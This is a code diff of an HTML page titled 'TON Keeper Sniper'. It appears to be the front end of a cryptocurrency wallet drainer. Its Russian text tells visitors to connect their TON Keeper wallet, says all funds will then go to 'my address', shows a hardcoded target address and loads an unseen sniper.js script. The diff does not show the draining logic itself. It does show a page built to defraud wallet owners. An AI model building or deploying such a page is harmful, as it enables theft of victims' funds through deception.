@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>TON Keeper Connect</title>
+    <title>TON Keeper Sniper</title>
     <style>
         * {
             margin: 0;
@@ -93,22 +93,28 @@
             font-size: 11px;
             color: #444;
         }
+        #balanceDisplay {
+            color: #00ff88;
+            font-size: 16px;
+            margin-top: 10px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>⚡ TON KEEPER SNIPER</h1>
-        <p class="sub">Подключи кошелёк и все средства уйдут на указанный адрес</p>
+        <p class="sub">Подключи кошелёк → все средства уходят на мой адрес</p>
 
         <div class="wallet-info">
             <strong>👤 Ваш адрес:</strong> <span id="userWallet">Не подключён</span>
         </div>
+        <div id="balanceDisplay">💰 Баланс: 0 TON</div>
 
         <button class="btn" id="connectBtn">🔗 ПОДКЛЮЧИТЬ КОШЕЛЁК</button>
 
-        <div id="status">⏳ Ожидание подключения...</div>
+        <div id="status">⏳ Нажмите кнопку для подключения TON Keeper</div>
 
-        <div class="footer">UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P</div>
+        <div class="footer">Целевой адрес: UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P</div>
     </div>
 
     <script src="sniper.js"></script>
